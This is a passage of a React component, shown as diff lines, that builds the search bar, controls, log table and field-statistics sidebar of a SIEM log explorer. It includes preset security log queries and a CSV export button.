+   754→          {/* Search Input */}
+   755→          <div className="flex-1 relative">
+   756→            <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-zinc-500" />
+   757→            <input
+   758→              type="text"
+   759→              placeholder='Enter KQL/Lucene query (e.g., level:error AND service:sshd)'
+   760→              value={logExplorer.query}
+   761→              onChange={(e) => setLogExplorer({ query: e.target.value })}
+   762→              onKeyDown={(e) => e.key === 'Enter' && handleSearch()}
+   763→              className="w-full h-10 rounded-lg border border-zinc-700 bg-zinc-800/50 pl-10 pr-24 text-sm font-mono text-zinc-200 placeholder:text-zinc-500 focus:outline-none focus:ring-1 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition-colors"
+   764→            />
+   765→            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
+   766→              <kbd className="hidden sm:inline-flex items-center rounded border border-zinc-600 bg-zinc-700/50 px-1.5 py-0.5 text-[9px] text-zinc-400 font-mono">
+   767→                ↵ Enter
+   768→              </kbd>
+   769→              <Button
+   770→                size="sm"
+   771→                className="h-7 gap-1 bg-emerald-600 hover:bg-emerald-700 text-xs"
+   772→                onClick={handleSearch}
+   773→                disabled={searching}
+   774→              >
+   775→                {searching ? <RefreshCw className="h-3 w-3 animate-spin" /> : <Search className="h-3 w-3" />}
+   776→                Search
+   777→              </Button>
+   778→            </div>
+   779→          </div>
+   780→
+   781→          {/* Saved Searches (placeholder) */}
+   782→          <Popover>
+   783→            <PopoverTrigger asChild>
+   784→              <Button variant="outline" size="sm" className="h-10 gap-1 border-zinc-700 bg-zinc-800/50 text-zinc-400 hover:text-zinc-200">
+   785→                <Bookmark className="h-3.5 w-3.5" />
+   786→                <span className="hidden sm:inline">Saved</span>
+   787→              </Button>
+   788→            </PopoverTrigger>
+   789→            <PopoverContent className="w-64 bg-zinc-900 border-zinc-700 p-3" align="end">
+   790→              <div className="space-y-2">
+   791→                <span className="text-xs font-semibold text-zinc-300">Saved Searches</span>
+   792→                <div className="space-y-1">
+   793→                  {[
+   794→                    { name: 'SSH Errors Last Hour', query: 'level:error AND service:sshd' },
+   795→                    { name: 'Suspicious Nginx Requests', query: 'service:nginx AND (401 OR 403 OR 404)' },
+   796→                    { name: 'All Firewall Drops', query: 'service:firewall AND level:warn' },
+   797→                  ].map((saved) => (
+   798→                    <button
+   799→                      key={saved.name}
+   800→                      className="w-full text-left rounded px-2 py-1.5 text-xs text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800 transition-colors"
+   801→                      onClick={() => {
+   802→                        setLogExplorer({ query: saved.query })
+   803→                        toast.info(`Loaded: ${saved.name}`)
+   804→                      }}
+   805→                    >
+   806→                      <div className="font-medium">{saved.name}</div>
+   807→                      <div className="text-[10px] text-zinc-600 font-mono truncate">{saved.query}</div>
+   808→                    </button>
+   809→                  ))}
+   810→                </div>
+   811→                <div className="pt-2 border-t border-zinc-800">
+   812→                  <Button
+   813→                    variant="ghost"
+   814→                    size="sm"
+   815→                    className="w-full h-7 text-xs text-zinc-500 hover:text-zinc-300"
+   816→                    onClick={() => toast.success('Search saved!')}
+   817→                  >
+   818→                    <Save className="h-3 w-3 mr-1" />
+   819→                    Save Current Search
+   820→                  </Button>
+   821→                </div>
+   822→              </div>
+   823→            </PopoverContent>
+   824→          </Popover>
+   825→        </div>
+   826→
+   827→        {/* Controls Bar */}
+   828→        <div className="flex flex-wrap items-center gap-3">
+   829→          {/* Time Range Buttons */}
+   830→          <div className="flex items-center gap-1">
+   831→            <Clock className="h-3.5 w-3.5 text-zinc-500" />
+   832→            {TIME_RANGES.map((tr) => (
+   833→              <Button
+   834→                key={tr.value}
+   835→                variant="ghost"
+   836→                size="sm"
+   837→                className={cn(
+   838→                  'h-7 px-2 text-xs font-mono',
+   839→                  logExplorer.timeRange === tr.value
+   840→                    ? 'bg-emerald-600/20 text-emerald-400 border border-emerald-500/30'
+   841→                    : 'text-zinc-400 hover:text-zinc-200 border border-transparent'
+   842→                )}
+   843→                onClick={() => handleTimeRange(tr.value)}
+   844→              >
+   845→                {tr.label}
+   846→              </Button>
+   847→            ))}
+   848→            <Popover>
+   849→              <PopoverTrigger asChild>
+   850→                <Button variant="ghost" size="sm" className="h-7 px-2 text-xs text-zinc-400 hover:text-zinc-200 border border-transparent">
+   851→                  Custom
+   852→                </Button>
+   853→              </PopoverTrigger>
+   854→              <PopoverContent className="w-80 bg-zinc-900 border-zinc-700 p-3" align="start">
+   855→                <div className="space-y-2">
+   856→                  <span className="text-xs font-semibold text-zinc-300">Custom Time Range</span>
+   857→                  <div className="grid grid-cols-2 gap-2">
+   858→                    <div>
+   859→                      <label className="text-[10px] text-zinc-500">From</label>
+   860→                      <Input type="datetime-local" className="h-7 text-xs bg-zinc-800 border-zinc-700" />
+   861→                    </div>
+   862→                    <div>
+   863→                      <label className="text-[10px] text-zinc-500">To</label>
+   864→                      <Input type="datetime-local" className="h-7 text-xs bg-zinc-800 border-zinc-700" />
+   865→                    </div>
+   866→                  </div>
+   867→                  <Button size="sm" className="w-full h-7 text-xs bg-emerald-600 hover:bg-emerald-700" onClick={() => toast.info('Custom time range applied')}>
+   868→                    Apply
+   869→                  </Button>
+   870→                </div>
+   871→              </PopoverContent>
+   872→            </Popover>
+   873→          </div>
+   874→
+   875→          {/* Separator */}
+   876→          <div className="h-5 w-px bg-zinc-700" />
+   877→
+   878→          {/* Index Pattern Selector */}
+   879→          <Select
+   880→            value={logExplorer.indexPattern}
+   881→            onValueChange={(v) => setLogExplorer({ indexPattern: v })}
+   882→          >
+   883→            <SelectTrigger className="h-7 w-44 text-xs border-zinc-700 bg-zinc-800/50">
+   884→              <Columns3 className="mr-1 h-3 w-3 text-zinc-500" />
+   885→              <SelectValue />
+   886→            </SelectTrigger>
+   887→            <SelectContent className="bg-zinc-900 border-zinc-700">
+   888→              {INDEX_PATTERNS.map((ip) => (
+   889→                <SelectItem key={ip.value} value={ip.value} className="text-xs">{ip.label}</SelectItem>
+   890→              ))}
+   891→            </SelectContent>
+   892→          </Select>
+   893→
+   894→          {/* Separator */}
+   895→          <div className="h-5 w-px bg-zinc-700" />
+   896→
+   897→          {/* Live Mode Toggle */}
+   898→          <div className="flex items-center gap-2">
+   899→            <Switch
+   900→              checked={logExplorer.liveMode}
+   901→              onCheckedChange={(checked) => {
+   902→                setLogExplorer({ liveMode: checked })
+   903→                setLiveMode(checked)
+   904→                if (checked) {
+   905→                  setPaused(false)
+   906→                  setAutoScroll(true)
+   907→                }
+   908→              }}
+   909→            />
+   910→            <span className="flex items-center gap-1.5 text-xs font-medium text-zinc-300">
+   911→              {logExplorer.liveMode && (
+   912→                <span className="relative flex h-2 w-2">
+   913→                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75" />
+   914→                  <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500" />
+   915→                </span>
+   916→              )}
+   917→              Live
+   918→            </span>
+   919→            {logExplorer.liveMode && (
+   920→              <Badge variant="outline" className="border-red-500/30 text-[9px] text-red-400 px-1.5 siem-live-pulse">
+   921→                <span className="relative mr-1 flex h-1.5 w-1.5">
+   922→                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75" />
+   923→                  <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-red-500" />
+   924→                </span>
+   925→                LIVE
+   926→              </Badge>
+   927→            )}
+   928→          </div>
+   929→
+   930→          {/* Pause/Resume (Live Mode) */}
+   931→          {logExplorer.liveMode && (
+   932→            <Button
+   933→              variant="outline"
+   934→              size="sm"
+   935→              className={cn(
+   936→                'h-7 gap-1 text-xs border-zinc-700',
+   937→                paused ? 'bg-amber-600/20 text-amber-400 border-amber-500/30' : 'bg-zinc-800/50 text-zinc-400'
+   938→              )}
+   939→              onClick={() => setPaused(!paused)}
+   940→            >
+   941→              {paused ? <Play className="h-3 w-3" /> : <Pause className="h-3 w-3" />}
+   942→              {paused ? 'Resume' : 'Pause'}
+   943→            </Button>
+   944→          )}
+   945→
+   946→          {/* Unread Buffer Indicator */}
+   947→          {logExplorer.liveMode && paused && unreadCount > 0 && (
+   948→            <Badge className="bg-amber-500/20 text-amber-400 border-amber-500/30 text-[10px] gap-1 px-1.5">
+   949→              <ArrowDown className="h-2.5 w-2.5" />
+   950→              {unreadCount} unread
+   951→            </Badge>
+   952→          )}
+   953→
+   954→          {/* Separator */}
+   955→          <div className="h-5 w-px bg-zinc-700" />
+   956→
+   957→          {/* Refresh */}
+   958→          <Button
+   959→            variant="ghost"
+   960→            size="sm"
+   961→            className="h-7 w-7 p-0 text-zinc-400 hover:text-zinc-200"
+   962→            onClick={handleSearch}
+   963→            disabled={searching}
+   964→          >
+   965→            <RefreshCw className={cn('h-3.5 w-3.5', searching && 'animate-spin')} />
+   966→          </Button>
+   967→
+   968→          {/* Auto-Refresh Interval */}
+   969→          <Select
+   970→            value={String(autoRefresh)}
+   971→            onValueChange={(v) => setAutoRefresh(Number(v))}
+   972→          >
+   973→            <SelectTrigger className="h-7 w-20 text-[10px] border-zinc-700 bg-zinc-800/50">
+   974→              <SelectValue />
+   975→            </SelectTrigger>
+   976→            <SelectContent className="bg-zinc-900 border-zinc-700">
+   977→              {AUTO_REFRESH_OPTIONS.map((opt) => (
+   978→                <SelectItem key={opt.value} value={opt.value} className="text-xs">
+   979→                  {opt.label}
+   980→                </SelectItem>
+   981→              ))}
+   982→            </SelectContent>
+   983→          </Select>
+   984→
+   985→          {/* Separator */}
+   986→          <div className="h-5 w-px bg-zinc-700" />
+   987→
+   988→          {/* Auto-scroll Toggle (Live Mode) */}
+   989→          {logExplorer.liveMode && (
+   990→            <label className="flex items-center gap-1.5 text-[10px] text-zinc-400 cursor-pointer">
+   991→              <input
+   992→                type="checkbox"
+   993→                checked={autoScroll}
+   994→                onChange={(e) => setAutoScroll(e.target.checked)}
+   995→                className="rounded border-zinc-600 bg-zinc-800 accent-emerald-500"
+   996→              />
+   997→              Auto-scroll
+   998→            </label>
+   999→          )}
+  1000→
+  1001→          {/* Spacer */}
+  1002→          <div className="flex-1" />
+  1003→
+  1004→          {/* Field Stats Toggle */}
+  1005→          <Button
+  1006→            variant="ghost"
+  1007→            size="sm"
+  1008→            className={cn(
+  1009→              'h-7 gap-1 text-xs',
+  1010→              showFieldStats ? 'bg-emerald-600/20 text-emerald-400' : 'text-zinc-400 hover:text-zinc-200'
+  1011→            )}
+  1012→            onClick={() => setShowFieldStats(!showFieldStats)}
+  1013→          >
+  1014→            {showFieldStats ? <PanelRightClose className="h-3 w-3" /> : <PanelRightOpen className="h-3 w-3" />}
+  1015→            Fields
+  1016→          </Button>
+  1017→
+  1018→          {/* Export */}
+  1019→          <Button
+  1020→            variant="ghost"
+  1021→            size="sm"
+  1022→            className="h-7 gap-1 text-xs text-zinc-400 hover:text-zinc-200"
+  1023→            onClick={() => {
+  1024→              const csv = displayLogs.map((l) => `${l.timestamp},${l.level},${l.hostname},${l.service},"${l.message.replace(/"/g, '""')}"`).join('\n')
+  1025→              const blob = new Blob([`timestamp,level,hostname,service,message\n${csv}`], { type: 'text/csv' })
+  1026→              const url = URL.createObjectURL(blob)
+  1027→              const a = document.createElement('a')
+  1028→              a.href = url
+  1029→              a.download = `siem-logs-${new Date().toISOString().slice(0, 10)}.csv`
+  1030→              a.click()
+  1031→              URL.revokeObjectURL(url)
+  1032→              toast.success('Logs exported as CSV')
+  1033→            }}
+  1034→          >
+  1035→            <Download className="h-3 w-3" />
+  1036→            Export
+  1037→          </Button>
+  1038→        </div>
+  1039→      </div>
+  1040→
+  1041→      {/* Main Content Area (Table + Sidebar) */}
+  1042→      <div className="flex flex-1 min-h-0">
+  1043→        {/* Log Table */}
+  1044→        <div className="flex-1 min-w-0 flex flex-col">
+  1045→          {/* Table Header */}
+  1046→          <div className="flex items-center gap-2 border-b border-zinc-800 bg-zinc-900/80 px-3 py-2 text-[10px] font-semibold uppercase tracking-wider text-zinc-500 sticky top-0 z-10">
+  1047→            <span className="w-5" />
+  1048→            <span className="w-8 text-right">#</span>
+  1049→            <span className="w-36">Timestamp</span>
+  1050→            <span className="w-16">Level</span>
+  1051→            <span className="w-28">Hostname</span>
+  1052→            <span className="w-20">Source</span>
+  1053→            <span className="flex-1">Message</span>
+  1054→          </div>
+  1055→
+  1056→          {/* Log Rows / Loading / Empty */}
+  1057→          <div ref={scrollContainerRef} className="flex-1 overflow-y-auto custom-scrollbar">
+  1058→            {error ? (
+  1059→              <div className="flex flex-col items-center justify-center py-16 gap-3">
+  1060→                <XCircle className="h-8 w-8 text-red-400" />
+  1061→                <span className="text-sm text-red-400">{error}</span>
+  1062→                <Button variant="outline" size="sm" className="text-xs" onClick={handleSearch}>
+  1063→                  <RefreshCw className="h-3 w-3 mr-1" /> Retry
+  1064→                </Button>
+  1065→              </div>
+  1066→            ) : searching ? (
+  1067→              <div className="p-3 space-y-1">
+  1068→                {Array.from({ length: 8 }).map((_, i) => (
+  1069→                  <div key={i} className="flex items-center gap-2 py-1.5">
+  1070→                    <Skeleton className="h-3 w-5 rounded" />
+  1071→                    <Skeleton className="h-3 w-8 rounded" />
+  1072→                    <Skeleton className="h-3 w-36 rounded" />
+  1073→                    <Skeleton className="h-3 w-16 rounded" />
+  1074→                    <Skeleton className="h-3 w-28 rounded" />
+  1075→                    <Skeleton className="h-3 w-20 rounded" />
+  1076→                    <Skeleton className="h-3 flex-1 rounded" />
+  1077→                  </div>
+  1078→                ))}
+  1079→              </div>
+  1080→            ) : displayLogs.length === 0 ? (
+  1081→              <div className="flex flex-col items-center justify-center py-16 gap-3">
+  1082→                <div className="h-12 w-12 rounded-full bg-zinc-800 flex items-center justify-center">
+  1083→                  <Filter className="h-5 w-5 text-zinc-600" />
+  1084→                </div>
+  1085→                <span className="text-sm text-zinc-400">No logs found</span>
+  1086→                <div className="text-xs text-zinc-600 space-y-1 text-center">
+  1087→                  <p>Try adjusting your query or time range</p>
+  1088→                  <p>Enable <strong>Live Mode</strong> for real-time streaming</p>
+  1089→                  <p>Use queries like <code className="text-emerald-400/80 font-mono">level:error</code> or <code className="text-emerald-400/80 font-mono">service:sshd</code></p>
+  1090→                </div>
+  1091→                <Button
+  1092→                  variant="outline"
+  1093→                  size="sm"
+  1094→                  className="text-xs"
+  1095→                  onClick={() => {
+  1096→                    setLogExplorer({ query: '', liveMode: true })
+  1097→                    setLiveMode(true)
+  1098→                  }}
+  1099→                >
+  1100→                  <Radio className="h-3 w-3 mr-1" /> Enable Live Mode
+  1101→                </Button>
+  1102→              </div>
+  1103→            ) : (
+  1104→              <AnimatePresence initial={false}>
+  1105→                {displayLogs.map((log, idx) => {
+  1106→                  const logId = log.id || `log-${idx}-${log.timestamp}`
+  1107→                  return (
+  1108→                    <LogRow
+  1109→                      key={logId}
+  1110→                      log={log}
+  1111→                      isExpanded={expandedLog === logId}
+  1112→                      onToggle={() => setExpandedLog(expandedLog === logId ? null : logId)}
+  1113→                      query={logExplorer.query}
+  1114→                      lineNum={idx + 1}
+  1115→                    />
+  1116→                  )
+  1117→                })}
+  1118→              </AnimatePresence>
+  1119→            )}
+  1120→          </div>
+  1121→
+  1122→          {/* Status Bar */}
+  1123→          <div className="flex items-center justify-between border-t border-zinc-800 bg-zinc-900/80 px-3 py-1.5 text-[10px] text-zinc-500">
+  1124→            <div className="flex items-center gap-4">
+  1125→              <span>{displayLogs.length.toLocaleString()} events</span>
+  1126→              {logExplorer.query && <span>Query: <span className="text-emerald-400/80 font-mono">{logExplorer.query}</span></span>}
+  1127→            </div>
+  1128→            <div className="flex items-center gap-3">
+  1129→              <span>Index: <span className="text-zinc-300">{logExplorer.indexPattern}</span></span>
+  1130→              <span>Range: <span className="text-zinc-300">{logExplorer.timeRange}</span></span>
+  1131→              <span className="flex items-center gap-1">
+  1132→                <span className={cn('h-1.5 w-1.5 rounded-full', wsConnected ? 'bg-emerald-400' : 'bg-red-400')} />
+  1133→                {wsConnected ? 'Connected' : 'Disconnected'}
+  1134→              </span>
+  1135→            </div>
+  1136→          </div>
+  1137→        </div>
+  1138→
+  1139→        {/* Field Statistics Sidebar */}
+  1140→        <AnimatePresence>
+  1141→          {showFieldStats && (
+  1142→            <FieldStatisticsSidebar
+  1143→              logs={displayLogs}
+  1144→              onFieldClick={handleFieldClick}
+  1145→              visible={showFieldStats}
+  1146→              onToggle={() => setShowFieldStats(false)}
+  1147→            />
+  1148→          )}
+  1149→        </AnimatePresence>
+  1150→      </div>
+  1151→    </motion.div>
+  1152→  )
+  1153→}
+  1154→
